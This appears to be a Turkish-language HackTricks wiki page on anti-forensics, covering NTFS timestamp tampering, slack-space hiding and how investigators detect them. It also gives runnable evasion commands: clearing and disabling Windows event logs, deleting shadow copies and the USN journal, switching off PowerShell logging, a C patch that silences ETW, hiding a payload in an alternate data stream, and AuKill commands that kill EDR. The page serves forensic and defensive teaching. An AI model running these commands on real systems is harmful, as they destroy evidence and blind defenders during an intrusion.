# Anti-Forensic Teknikler

{{#include ../../banners/hacktricks-training.md}}

## Zaman Damgaları

Bir saldırgan, tespit edilmekten kaçınmak için **dosyaların zaman damgalarını değiştirmekle** ilgilenebilir.\
Zaman damgalarını MFT içinde `$STANDARD_INFORMATION` \_\_ ve \_\_ `$FILE_NAME` özniteliklerinde bulmak mümkündür.

Her iki öznitelikte de 4 zaman damgası bulunur: **Değiştirme**, **erişim**, **oluşturma** ve **MFT kayıt değiştirme** (MACE veya MACB).

**Windows explorer** ve diğer araçlar bilgileri **`$STANDARD_INFORMATION`** içinden gösterir.

### TimeStomp - Anti-forensic Tool

Bu araç, **`$STANDARD_INFORMATION`** içindeki zaman damgası bilgilerini **değiştirir**, ancak **`$FILE_NAME`** içindeki bilgileri **değiştirmez**. Bu nedenle **şüpheli** **etkinlikleri** **belirlemek** mümkündür.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal), birimin değişikliklerini izleyen NTFS'nin (Windows NT file system) bir özelliğidir. [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) aracı bu değişikliklerin incelenmesine olanak tanır.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal), birimin değişikliklerini izleyen NTFS'nin (Windows NT file system) bir özelliğidir. ...](<../../images/image (801).png>)

Önceki görüntü, **araç** tarafından gösterilen **çıktıdır**; burada dosya üzerinde **bazı değişikliklerin yapıldığı** görülebilir.

### $LogFile

**Bir dosya sistemindeki tüm metadata değişiklikleri**, [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) olarak bilinen bir işlemle günlüğe kaydedilir. Günlüğe kaydedilen metadata, bir NTFS dosya sisteminin kök dizininde bulunan `**$LogFile**` adlı bir dosyada tutulur. Bu dosyayı ayrıştırmak ve değişiklikleri belirlemek için [LogFileParser](https://github.com/jschicht/LogFileParser) gibi araçlar kullanılabilir.

![Usnjrnl - $LogFile: Bir dosya sistemindeki tüm metadata değişiklikleri, write-ahead logging olarak bilinen bir işlemle günlüğe kaydedilir. Günlüğe kaydedilen metadata, kök dizinde bulunan $LogFile adlı bir dosyada tutulur...](<../../images/image (137).png>)

Yine, aracın çıktısında **bazı değişikliklerin yapıldığını** görmek mümkündür.

Aynı aracı kullanarak zaman damgalarının **hangi zamanda değiştirildiğini** belirlemek mümkündür:

![Usnjrnl - $LogFile: Aynı aracı kullanarak zaman damgalarının hangi zamanda değiştirildiğini belirlemek mümkündür](<../../images/image (1089).png>)

- CTIME: Dosyanın oluşturulma zamanı
- ATIME: Dosyanın değiştirilme zamanı
- MTIME: Dosyanın MFT kayıt değiştirme zamanı
- RTIME: Dosyanın erişim zamanı

### `$STANDARD_INFORMATION` ve `$FILE_NAME` karşılaştırması

Şüpheli şekilde değiştirilmiş dosyaları belirlemenin başka bir yolu, **uyuşmazlıkları** bulmak için her iki öznitelikteki zamanı karşılaştırmaktır.

### Nanosaniyeler

**NTFS** zaman damgalarının **100 nanosaniyelik** bir **hassasiyeti** vardır. Bu nedenle 2010-10-10 10:10:**00.000:0000 gibi zaman damgalarına sahip dosyaların bulunması çok şüphelidir**.

### SetMace - Anti-forensic Tool

Bu araç hem `$STARNDAR_INFORMATION` hem de `$FILE_NAME` özniteliklerini değiştirebilir. Ancak Windows Vista'dan itibaren bu bilgileri değiştirmek için çalışan bir OS gerekir.

## Data Hiding

NFTS, cluster ve minimum bilgi boyutunu kullanır. Bu, bir dosya bir cluster ve yarım cluster kullanıyorsa, **kalan yarının dosya silinene kadar hiçbir zaman kullanılamayacağı** anlamına gelir. Böylece **slack space içine veri gizlemek** mümkündür.

slacker gibi araçlar verilerin bu "gizli" alana saklanmasına olanak tanır. Ancak `$logfile` ve `$usnjrnl` analizi bazı verilerin eklendiğini gösterebilir:

![SetMace - Anti-forensic Tool - Data Hiding: Verilerin bu "gizli" alana saklanmasına olanak tanıyan slacker gibi araçlar vardır. Ancak `$logfile` ve `$usnjrnl` analizi bazı verilerin eklendiğini gösterebilir...](<../../images/image (1060).png>)

Böylece FTK Imager gibi araçlar kullanılarak slack space geri alınabilir. Bu tür araçların içeriği obfuscated veya hatta encrypted şekilde kaydedebileceğini unutmayın.

## UsbKill

Bu araç, USB portlarında herhangi bir değişiklik algılanırsa **bilgisayarı kapatır**.\
Bunu keşfetmenin bir yolu, çalışan işlemleri incelemek ve **çalışan her Python scriptini gözden geçirmektir**.

## Live Linux Distributions

Bu distrolar **RAM** belleği içinde **çalıştırılır**. Bunları tespit etmenin tek yolu, NTFS file-system'in write permissions ile mount edilmesidir. Yalnızca read permissions ile mount edilmişse intrusion'ı tespit etmek mümkün olmaz.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Forensics investigation'ı çok daha zor hale getirmek için çeşitli Windows logging yöntemlerini devre dışı bırakmak mümkündür.

### Disable Timestamps - UserAssist

Bu, her executable'ın kullanıcı tarafından çalıştırıldığı tarih ve saatleri tutan bir registry key'dir.

UserAssist'i devre dışı bırakmak iki adım gerektirir:

1. UserAssist'in devre dışı bırakılmasını istediğimizi belirtmek için `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` ve `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` registry key'lerinin her ikisini de sıfıra ayarlayın.
2. `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` gibi görünen registry subtree'lerinizi temizleyin.

### Disable Timestamps - Prefetch

Bu, Windows sisteminin performansını artırmak amacıyla çalıştırılan application'lar hakkındaki bilgileri kaydeder. Ancak bu bilgiler forensics uygulamaları için de yararlı olabilir.

- `regedit` çalıştırın
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` file path'ini seçin
- Hem `EnablePrefetcher` hem de `EnableSuperfetch` üzerine sağ tıklayın
- Değeri 1'den (veya 3'ten) 0'a değiştirmek için her biri üzerinde Modify'ı seçin
- Restart

### Disable Timestamps - Last Access Time

Windows NT server üzerinde bir NTFS volume'den her folder açıldığında sistem, last access time olarak adlandırılan **her listelenen folder üzerindeki bir timestamp field'ı günceller**. Yoğun kullanılan bir NTFS volume'de bu durum performansı etkileyebilir.

1. Registry Editor'ı (Regedit.exe) açın.
2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem` konumuna gidin.
3. `NtfsDisableLastAccessUpdate` değerini arayın. Mevcut değilse bu DWORD'u ekleyin ve değerini 1 olarak ayarlayın; bu işlem devre dışı bırakır.
4. Registry Editor'ı kapatın ve server'ı reboot edin.

### Delete USB History

Tüm **USB Device Entries**, USB Device'ı PC'nize veya Laptop'ınıza taktığınızda oluşturulan sub key'leri içeren **USBSTOR** registry key'i altında Windows Registry'de saklanır. Bu key'i burada bulabilirsiniz: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Bunu silmek**, USB history'yi silecektir.\
Bunları sildiğinizden emin olmak (ve silmek) için [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) aracını da kullanabilirsiniz.

USB'ler hakkında bilgi kaydeden başka bir dosya da `C:\Windows\INF` içindeki `setupapi.dev.log` dosyasıdır. Bu da silinmelidir.

### Disable Shadow Copies

`vssadmin list shadowstorage` ile shadow copy'leri **listeleyin**\
`vssadmin delete shadow` çalıştırarak bunları **silin**

[https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) adresindeki adımları izleyerek bunları GUI üzerinden de silebilirsiniz.

Shadow copy'leri devre dışı bırakmak için [steps from here](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Windows start button'a tıkladıktan sonra text search box'a "services" yazarak Services programını açın.
2. Listeden "Volume Shadow Copy" öğesini bulun, seçin ve sağ tıklayarak Properties'e erişin.
3. "Startup type" drop-down menu'sünden Disabled'ı seçin ve ardından Apply ve OK'e tıklayarak değişikliği onaylayın.

Shadow copy içinde hangi dosyaların kopyalanacağını registry'deki `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` üzerinden değiştirmek de mümkündür.

### Overwrite deleted files

- Bir **Windows tool** kullanabilirsiniz: `cipher /w:C`. Bu, cipher'a C drive içindeki kullanılabilir boş disk alanındaki tüm verileri kaldırmasını bildirir.
- [**Eraser**](https://eraser.heidi.ie) gibi araçları da kullanabilirsiniz.

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> "Windows Logs"u genişletin --> Her category'ye sağ tıklayın ve "Clear Log"u seçin
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Services bölümünde "Windows Event Log" service'ini devre dışı bırakın
- `WEvtUtil.exec clear-log` veya `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Windows 10/11 ve Windows Server'ın güncel sürümleri, `Microsoft-Windows-PowerShell/Operational` altında (4104/4105/4106 event'leri) **zengin PowerShell forensic artifact'ları** tutar.
Saldırganlar bunları anlık olarak devre dışı bırakabilir veya silebilir:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Savunmacılar, bu registry key'lerinde yapılan değişiklikleri ve PowerShell event'lerinin yüksek hacimli şekilde silinmesini izlemelidir.

### ETW (Event Tracing for Windows) Patch

Endpoint security products, ETW'ye büyük ölçüde dayanır. 2024'te popüler bir evasion yöntemi, bellekteki `ntdll!EtwEventWrite`/`EtwEventWriteFull` işlevlerine patch uygulayarak her ETW çağrısının event üretmeden `STATUS_SUCCESS` döndürmesini sağlamaktır:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoC'ler (ör. `EtwTiSwallow`) aynı primitive'i PowerShell veya C++ ile uygular.
Patch **process-local** olduğundan, diğer process'lerin içinde çalışan EDR'ler bunu gözden kaçırabilir.
Detection: bellekteki `ntdll` ile diskteki `ntdll`'yi karşılaştırın veya user-mode'dan önce hook uygulayın.

### Alternate Data Streams (ADS) Yeniden Canlanışı

2023'teki malware campaign'lerinde (ör. **FIN12** loader'ları), geleneksel scanner'ların görüş alanından uzak kalmak için second-stage binary'lerini ADS içinde stage ettikleri görüldü:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
`dir /R`, `Get-Item -Stream *` veya Sysinternals `streams64.exe` ile stream'leri listeleyin.
Host file'ı FAT/exFAT'e veya SMB üzerinden kopyalamak gizli stream'i kaldırır ve
payload'ın araştırmacılar tarafından kurtarılmasını sağlayabilir.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver artık ransomware saldırılarında **anti-forensics** amacıyla
rutin olarak kullanılmaktadır.
Açık kaynaklı **AuKill** aracı, şifreleme ve log destruction işlemlerinden **önce** EDR ve forensic
sensörlerini askıya almak veya sonlandırmak için imzalı ancak güvenlik açığı bulunan bir driver'ı
(`procexp152.sys`) yükler:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Driver daha sonra kaldırılır ve geride minimum düzeyde artifact bırakır.<sup>[[1]](#references)</sup>
Mitigations: Microsoft vulnerable-driver blocklist'i (HVCI/SAC) etkinleştirin
ve user-writable path'lerden kernel-service oluşturulması için alert oluşturun.

---

## Linux Anti-Forensics: Self-Patching ve Cloud C2 (2023–2025)

### Detection'ı azaltmak için compromised service'leri self-patch etme (Linux)
Adversaries, yeniden exploitation'ı önlemek ve vulnerability-based detection'ları bastırmak için bir service'i exploit ettikten hemen sonra giderek daha fazla “self-patch” ediyor. Buradaki fikir, vulnerable component'leri en güncel legitimate upstream binary/JAR'larıyla değiştirmektir; böylece scanner'lar host'un patch'lenmiş olduğunu bildirirken persistence ve C2 çalışmaya devam eder.<sup>[[3]](#references)</sup>

Example: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
- Post-exploitation sonrasında attackers, Maven Central'dan (repo1.maven.org) legitimate JAR'lar indirdi, ActiveMQ install'ı içindeki vulnerable JAR'ları sildi ve broker'ı yeniden başlattı.
- Bu işlem initial RCE'yi kapatırken diğer foothold'ları (cron, SSH config değişiklikleri, ayrı C2 implant'ları) korudu.

Operational example (illustrative)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Adli inceleme/hunting ipuçları
- Zamanlanmamış binary/JAR değişimleri için service dizinlerini inceleyin:
- Debian/Ubuntu: `dpkg -V activemq` komutunu çalıştırın ve file hash/path değerlerini repo mirror'larıyla karşılaştırın.
- Diskte package manager tarafından sahiplenilmeyen JAR versiyonlarını veya out-of-band güncellenmiş symbolic link'leri arayın.
- Timeline: İlk compromise zaman aralığıyla ctime/mtime değerlerini ilişkilendirmek için `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` komutunu kullanın.
- Shell history/process telemetry: İlk exploitation işleminden hemen sonra `repo1.maven.org` veya diğer artifact CDN'lerine yapılan `curl`/`wget` isteklerine dair kanıtları arayın.
- Change management: Yalnızca patched bir versiyonun mevcut olduğunu doğrulamakla kalmayın; “patch” işlemini kimin ve neden uyguladığını doğrulayın.

### Bearer token'lar ve anti-analysis stager'ları ile Cloud-service C2
Gözlemlenen tradecraft, birden fazla long-haul C2 path'ini ve anti-analysis packaging yöntemlerini bir arada kullandı:<sup>[[3]](#references)</sup>
- Sandboxing ve static analysis'ı zorlaştırmak için password-protected PyInstaller ELF loader'ları (ör. encrypted PYZ, `/_MEI*` altında temporary extraction).
- Indicators: `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS` gibi `strings` sonuçları.
- Runtime artifacts: `/tmp/_MEI*` veya özel `--runtime-tmpdir` path'lerine extraction.
- Hardcoded OAuth Bearer token'lar kullanan Dropbox-backed C2
- Network markers: `Authorization: Bearer <token>` ile birlikte `api.dropboxapi.com` / `content.dropboxapi.com`.
- Normalde file sync yapmayan server workload'larından Dropbox domain'lerine giden outbound HTTPS trafiğini proxy/NetFlow/Zeek/Suricata üzerinde araştırın.
- Tunneling üzerinden parallel/backup C2 (ör. Cloudflare Tunnel `cloudflared`); kanallardan biri engellense bile control'ü korumak için.
- Host IOCs: `cloudflared` process/unit'leri, `~/.cloudflared/*.json` config'i ve Cloudflare edge'lerine outbound 443 bağlantıları.

### Erişimi sürdürmek için Persistence ve “hardening rollback” (Linux örnekleri)
Attackers sıklıkla self-patching işlemini durable access path'leriyle birleştirir:<sup>[[3]](#references)</sup>
- Cron/Anacron: Periyodik execution için her `/etc/cron.*/` directory'sindeki `0anacron` stub'ında yapılan değişiklikler.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: root login'lerini etkinleştirme ve düşük yetkili account'lar için default shell'leri değiştirme.
- Root login etkinleştirmesini araştırın:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- System account'ları (ör. `games`) üzerindeki şüpheli interactive shell'leri araştırın:
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Disk'e bırakılan ve aynı zamanda cloud C2'ye contact eden random, kısa isimli beacon artifact'leri (8 alphabetical karakter):
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders, ilk exploitation'ı gizlemek için kullanılan anti-forensic self-remediation işlemlerini ortaya çıkarmak üzere bu artifact'leri external exposure ve service patching event'leriyle ilişkilendirmelidir.

## References

- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
